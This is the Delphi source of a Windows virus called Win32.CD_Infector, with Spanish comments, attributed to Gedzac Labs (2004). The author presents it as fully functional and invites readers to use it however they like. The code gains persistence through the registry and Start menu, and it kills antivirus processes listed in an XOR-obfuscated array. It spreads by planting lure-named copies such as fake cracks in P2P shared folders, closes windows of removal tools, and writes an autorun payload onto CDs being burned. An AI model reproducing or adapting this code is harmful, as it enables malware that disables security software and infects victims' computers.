   program CdInfecter;
   //******************************
   //Desarrollado en Delphi 5
   //por Pana_Infierno
   //En Chile para Mitosis 3
   //Win32.CD_Infector@Ch
   //Begin  Sabado  04 diciembre 2004 a las 22:30 pm
   //End   Domingo 05 diciembre 2004 a las 02:44 am
   // Testeado con Bit Defender Antivirus 7 Actualizado a la
   // Fecha 04-12-2004
   // Descripcion:
   // Virus que infectara los pcs que tengan instalado Windows Xp
   // y grabador de CD se infectara el cd con un Autorun...
    //*******************************************************************
   //No colocare extrañas palabras que digan que no me hago responsable
   //por lo que hagan.... yaaaaaaaaaaaaaa.....
   //Hagan lo que se les antoje con mis codigos
   //Me da igual
   //*******************************************************************
   //**************** AGRADECIMIENTOS **********************************
   // Claro eso si, agradecer a mis compañeros de Gedzac Labs por todo
   // el apoyo prestado, codigos e ideas.
   // A la traductora del texto anneke_dulac
   //*******************************************************************
   //*************** SORRY ************************************
   // Si alguien ve un codigo que pudo haber sido desarrollado por el
   //le agradezco y a la vez pido disculpas si le ha molestado...
   uses
   SysUtils,Registry,Windows,TLHelp32,Classes,Messages;
     const
       NombreVirus:String ='Win32.CD_Infector@Ch';
     var
       F: textfile;
       Sem  : THandle;
       Registro    :TRegistry;
       dire,name,path:string;
       PathProgramas:String;
       PathWindows:STRING;
       ELTImERmsg:Tmsg;
       ThreadId:Dword;
       ArchProg:string;

   Function EncDes(Texto:string;Clave:integer):string;
   var
       Nuevo:string;
       Largo,I:Integer;
   begin

    Largo := strLen(PChar(Texto));
     For i := 1 to Largo do
      begin
       Nuevo := Nuevo + chr(ord(Texto[i]) xor Clave);
      end;
       EncDes := Nuevo;
   end;


   Function LeerReg(Llave : HKEY; ruta,llavex:string): string;
   VAR
     Reg:TRegistry;
    Begin
      Reg := TRegistry.Create;
      Reg.RootKey := Llave;
      IF Reg.OpenKeyReadOnly(ruta) Then
      Result := Reg.ReadString(llavex);
   End;

   FUNCTION Asesinar(archivo: string): integer;
   CONST
     Terminar_proceso=$0001;
   VAR
     CLP: BOOL;
     Lahandle: THandle;
     Procesos32: TProcessEntry32;
    Begin
      Result := 0;
      Lahandle := CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
      Procesos32.dwSize := Sizeof(Procesos32);
      CLP := Process32First(lahandle,Procesos32);
      while integer(CLP) <> 0 DO Begin
      IF ((UpperCase(ExtractFileName(Procesos32.szExeFile)) = UpperCase(archivo)) Or
      (UpperCase(Procesos32.szExeFile) =  UpperCase(archivo))) then
      Result := Integer(TerminateProcess(OpenProcess(Terminar_proceso,BOOL(0),Procesos32.th32ProcessID), 0));
      CLP := Process32Next(lahandle,Procesos32);
      End;
      CloseHandle(lahandle);
   END;

     function GetWindowsDirectory : String;
     var
        pcWindowsDirectory : PChar;
        dwWDSize           : DWORD;
     begin
        dwWDSize := MAX_PATH + 1;
        GetMem( pcWindowsDirectory, dwWDSize );
        try
           if Windows.GetWindowsDirectory( pcWindowsDirectory, dwWDSize ) <> 0 then
              Result := pcWindowsDirectory;
        finally
           FreeMem( pcWindowsDirectory );
        end;
     end;

   Function ObtienePath(De:String):string;
   var
     Registro: TRegIniFile;
   begin
     Registro :=TRegIniFile.Create('Software\MicroSoft\Windows\CurrentVersion\Explorer');
     Result:= Registro.ReadString('Shell Folders',De,'');
     Registro.Free;
   end;

   procedure InfectarSistema;
   begin
           copyfile(pchar(path),pchar(PathWindows+'\MsnPlus.exe'),true);
   end;

   Procedure KillAvs;
   var
    i:integer;
   CONST AVS:array[0..301] of string=
   (
   'fqw45)b b','fqwjhi)b b','}hibfkfuj)b b','qtopni45)b b','qbs>2)b b','setdfi)b b','tbuq>2)b b','Itwdkbfi)b b','dkufq)dhj','tdfi45)b b','ufq0)b b','ifqp)b b','hrswhts)b b','ijfni)b b','ifqis)b b','jwasuf~)b b','khdlchpi5777)b b','ndttrwwis)b b','ndkhfc>2)b b','nfjfww)b b','anicqnur)b b','a*f`is>2)b b','cq>2)b b','cq>2Xh)b b','dkfp>2ds)b b','danfrcns)b b','fqprwc45)b b','fqwsd45)b b','Xfqw45)b b','fq`dsuk)b b','fwq cpni)b b','Xfqwdd)b b','fqwdd)b b','panicq45)b b','qtbdhju)b b','sct5*is)b b','tpbbw>2)b b','BANIBS45)B_B','tdutdfi)b b','tfabpbe)b b','wbutap)b b','ifqtdobc)b b','iqd>2)b b','intrj)b b','ifqkr45)b b','FKH@TBUQ','FJHI>_','FQ@TBUQ>','FQ@P','fqlwhw','fqltbuqndb','FqlTbuq','fqlpdsk>','FQ_JHINSHU>_','FQ_JHINSHUIS','FQ_VRFU','jhhknqb)b b','mbc)b b','ndtrww>2)b b','nejfqtw)b b','aup)b b','a*tshwp)b b','btwpfsdo)b b','wuhdb w','ankbjhi)b b','ub`jhi)b b','cqw>2)b b','danfcjni)b b','fqpni>2)b b','fqwj)b b','fqw)b b','fqb45)b b','fisn*suhmfi)b b','pbetdfi)b b','pbetdfi )b b','qttdfi37)b b',
   'sct5*>?)b b','T~jWuh ~Tqd','T^JSUF^','SFRJHI','SDJ','SCT*4','SAFL','qedjtbuq','QeDhit','QNU*OBKW','QWD45','QWSUF^','QTJFNI','qtjhi','PNJJRI45','P@AB>2','PBESUFW','PFSDOCH@','PuFcjni','twoni )b b','tdfiwj)b b','ubtdrb)b b','wdapfkkndhi)b b','wfqdk)b b','irw`ufcb)b b','ifqpis)b b','ifqfwp45)b b','krfkk)b b','nhjhi>?)b b','ndjhhi)b b','awuhs)b b','a*wuhs>2)b b','btfab)b b','dkbfibu4)b b','NEJFTI)B_B','FQ_P','da`Pn}','DJ@UCNFI','DHIIBDSNHIJHINSHU','DWCDkis','CBAPFSDO','DSUK','cbafkbus','cbatdfi`rn','CHHUT','BAWBFCJ','BSURTSDNWB','BQWI','B_WBUS','afjbo45','ado45','ano45','ekfdlndb)b b','fqtdobc45)b b','fqwcht45)b b','fqwis)b b','fqdhithk)b b','fdlpni45)b b','IPSHHK61','wddpni>0','WUH@UFJFRCNSHU','WHW4SUFW','WUHDBTTJHINSHU','WHUSJHINSHU','WHWUH_^','wdtdfi','wdisjhi','wfqwuh ~','WFCJNI','wqnbp>2','ufwfww)b b','UBFKJHI','USQTDI>2','qttsfs)b b','qbssuf~)b b','sdf)b b','tjd)b b','tdfi>2)b b','ufq0pni)b b','wddpni>?)b b','LWAP45)B_B','FCQ_CPNI','wfcjni)b b','ihujnts)b b','ifqp45)b b','i45tdfi)b b',
   'khhlhrs)b b','nafdb)b b','ndkhfcis)b b','TW^__','TT4BCNS','TpbbwIbs','nfjtbuq)b b','aw*pni)b b','a*wuhs)b b','bdbi`nib)b b','dkbfibu)b b','danic)b b','ekfdlc)b b','URKFRIDO','tetbuq','TPIBSTRW','PuDsuk','fqwrwc)b b','fqltbuq)b b','frshchpi)b b','Xfqwj)b b','fqwj)b b','ub`bcns)b b','jtdhian`)b b','AWUHS>2)B_B','NEJFTI)B_B','tad)b b','ub`bcs45)b b','haa`rfuc)b b','wfq)b b','wfqjfnk)b b','wbu)b b','wbuc)b b','wbustl)b b','wburwc)b b','wbuqfd)b b','wbuqfdc)b b','so)b b','so45)b b','so45rwc)b b','sofq)b b','soc)b b','soc45)b b','sojfnk)b b','fkbustqd)b b','fjhi)b b','lwa)b b','fisnqnu','fqt~ij`u)b b','danibs)b b','danibs45)b b','ndjhi)b b','khdlchpifcqfidbc)b b','krdhjtbuqbu)b b','jdfabb','ifqfwtqd)b b','ifquriu)b b','inttbuq)b b','itdobc45)b b','wddnhjhi)b b','wddjfni)b b','wqnbp>2)b b','Fqis)b b','Dkfp>2da)b b','Cqw>2X7)b b','Qtdfi37)b b','Ndtrwwis)b b','Mbcn)b b','I45tdfip)b b','Wfqtdobc)b b','Wfqp)b b','Fqubw45)b b','Jhinshu)b b','at`l45','atj45','atjf45','atje45','`ejbir','@EWHKK','@BIBUNDT',
   '@RFUC','NFJTSFST','NTUQ>2','KCWUHJBIR','KCTDFI','KRTWS','JDJIOCKU','JDSHHK','JDRWCFSB','JDQTUSB','J@OSJK','JNINKH@','JDQTTOKC','JDF@BIS','JWATBUQNDB','JPFSDO','IbhPfsdoKh`','IQTQD45','IPTbuqndb','IS_dhian`','ISQCJ','isustdfi','iwttqd','iwtdobdl','ibsrsnkt','icc45','IFQBI@IFQB_62','ihstsfus)b b','}fwuh)b b','wvubjhqb)dhj','Erkk@rfuc','DDFWW)B_B','qbs>?)b b','QBS45)B_B','QDHISUHK)B_B','dkfp>2)b b','FIST','FSDHI','FSRWCFSBU','FSPFSDO','FrshSufdb','FQ@DD45','Fq`Tbuq','FQPNIIS','aiue45','atff','atfq45',']FW)B_B',']FWC)B_B',']FWWU@)B_B',']FWT)B_B',']DFW)B_B','wapf`bis)b b','wapdhi)b b','ecjdhi)b b','ecif`bis)b b','ectpnsdo)b b','ectt)b b','ectpnsdo)b b','ecjdhi)b b');
    Begin
     for i:=0 to 301 do
      begin
          Asesinar(EncDes(avs[i],7));
      end;
    end;

   Procedure InfectP2P;
   var
    i,k:integer;
   const P2P: array[0..18] of Pchar = ('\appleJuice\incoming\', '\eDonkey2000\incoming\','\Gnucleus\Downloads\','\Grokster\My Grokster\','\ICQ\shared files\','\Kazaa\My Shared Folder\','\KaZaA Lite\My Shared Folder\','\LimeWire\Shared\','\morpheus\My Shared Folder\','\Overnet\incoming\','\Shareaza\Downloads\','\Swaptor\Download\','\WinMX\My Shared Folder\','\Tesla\Files\','\XoloX\Downloads\','\Rapigator\Share\','\KMD\My Shared Folder\','\BearShare\Shared\','\eMule\Incoming\');
   const Name:array[0..10]  of Pchar = ('Pamela Anderson.exe', 'Crack Nero Express.exe','Torrent.exe','Crack Norton.exe','Crack Msn.exe','Crackear Msn.exe','Winamp.exe','Winrar360.exe','Norton 2005.exe','Pamela.jpg.exe','Crack Msn 7.0.exe');

    Begin
    for k:=0 to 10 do
     begin
     for i:=0 to 18 do
      begin
       CopyFile(Pchar(Path),pchar(ArchProg+P2P[i]+Name[k]),true);
      end;
     end;

    for k:=0 to 8 do
     begin
      CopyFile(Pchar(Path),pchar('C:\My Download\'+Name[k]),true);
     end;

    for k:=0 to 8 do
     begin
      CopyFile(Pchar(Path),pchar('C:\My Downloads\'+Name[k]),true);
     end;

    End;


   Procedure GrabaRegistro;
    begin
     Registro:=TRegistry.create;
     Registro.RootKey := HKEY_LOCAL_MACHINE;
     if Registro.OpenKey('SOFTWARE\Microsoft\Windows\CurrentVersion\Run',FALSE) then
       Registro.WriteString('MsnPlus',PathWindows + '\MsnPlus.pif');
       Registro.Destroy;
    end;

    procedure InfectarMenuInicio;
     Begin
      PathProgramas:=(ObtienePath('Programs'));
      PathProgramas:=PathProgramas + '\inicio';
      CopyFile(pchar(Path),Pchar(PathProgramas + '\MsnPlus.pif'),true);
     end;

   Procedure UnaVez;
    begin
      Sem := CreateSemaphore(nil,0,1,'PROGRAM_NAME');
      if ((Sem <> 0) and (GetLastError = ERROR_ALREADY_EXISTS)) then
      begin
        CloseHandle( Sem );
      Halt;
      end;
    end;

   Procedure MatarVarios;
   var
    Ventana : Thandle;
    i:integer;
   CONST
    Ventanas:array[0..4] of Pchar=
   ('Hmd`g`z}{hmf{)ml)}h{lhz)ml)^`gmf~z','\}`e`mhm)ml)jfgo`n|{hj`úg)mle)z`z}ldh','Lm`}f{)mle)[ln`z}{f','Jfgzfeh)ml)_`{}|he)Yj','Jl{{h{)Y{fn{hdh');

   begin
   for i:=0 to 4 do
    begin
      Ventana:=FindWindow(nil,Pchar(EncDes(Ventanas[i],9)));
       if Ventana <> 0 Then
        begin
         SendMessage(Ventana,WM_CLOSE,0,0);
        end;
    end;
   end;


   Procedure CopiarEnCD;
   Var
     Ruta:String;
   begin
   //buscaremos si se abre el dialogo para grabar el cd de windows xp
   if FindWindow(nil,'Asistente para grabación de CD') <> 0 then
    begin
   //Si encontramos la ventana entonces buscaremos la ruta para copiar nuestra
   //Copia del virus y el archivo autorun para que este se inicie automaticamente
   //al colocar el CD

   ruta:=  LeerReg(HKEY_CURRENT_USER,'\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders','CD Burning');
   //Tenemos la ruta en el disco copiaremos el archivo
   //Copiamos el archivo en la carpeta donde se guardan los archivos que
   //seran copiados en el CD
   //...Vere si puedo hacer que funcione el autorun si el archivo esta
   //...oculto no estoy seguro hare una prueba... asi uso la rutina para
   //que no se vean los archivos ocultos o de sistema y pasar mas desapercibido
   //mmm, no me deja guardar archivos ocultos en el cd...
   //Sigo intentando...
   //Ya pruebas terminadas, aunque oculte el archivo que sera grabado cuando lo abro
   //en mi pc me muestra de todos modos los archivos que hay en el CD, pero la
   //Infeccion ya esta realizada asi que  sigamos
   //Escribiremos un Autorun Simple
       AssignFile(f,(Ruta+'\Autorun.inf'));
       Rewrite(f);
       Writeln(f,'[autorun]');
       Writeln(f,'open=CD.pif');
   //no le pondremos icono
       CloseFile(f);
   //Copiamos el archivo al destino del CD
       CopyFile(Pchar(Path),Pchar(Ruta+'\CD.pif'),True);
   //    el tiempo de espera sera de 20 minutos que es lo que demora un
   //    grabador lento de 4 x en grabar un cd...
   //esperaremos unos 20 minutos y seguiremos buscando si hay mas
   //dialogos para grabar nuevos cds
   Sleep(1200000);
   //Virus concluido
   //Lo probare ahora
   // Virus 100 % Funcional...
    end;
   end;

   procedure Timer;
    begin
     SetTimer(0, 0, 1, nil);
      while (GetMessage(ElTimerMsg, 0, 0, 0)) do
       begin
        MatarVarios;
       end;
    end;



    begin
   //************************ Aca va el codigo... *************************
    PathWindows:=GetWindowsDirectory;
    dire:=ExtractFilePath(ParamStr(0));
    name:=ExtractfileName(ParamStr(0));
    path:=dire+name;
    ArchProg:=LeerReg(HKEY_LOCAL_MACHINE,'\Software\Microsoft\Windows\CurrentVersion\','ProgramFilesDir');
   //Con esta funcion solo ejecutaremos una copia del virus en el pc
   UnaVez;
   //Tal como dice infecta el menu de inicio
   InfectarMenuInicio;
   //Infecta el sistema con el Archivo virico
   InfectarSistema;
   //Graba en el registro de sistema para iniciarse al comienzo
   GrabaRegistro;
   //Mata procesos de antivirus y otros
   KillAvs;
   //Infecta las carpetas P2P
   InfectP2P;

   //Este hilo se ejecutara permanentemente en busca de algun programa
   //que sirva para eliminar el virus

    CreateThread(nil,0,@timer,nil,0,ThreadId);


   //Crearemos un timer que verificara cada 2 segundos si se ha abierto el dialogo
   //de grabacion de CD de WinXP

    SetTimer(0, 0, 2000, nil);
     while (GetMessage(ElTimerMsg, 0, 0, 0)) do
      begin
       CopiarEnCD;
      end;
   end.

   //                GEDZAC LABS 2004                   //
   //***** Desarrollado en Chile con Calidad Mundial *****

   // Quien penso que en Chile no se desarrollan Virus...
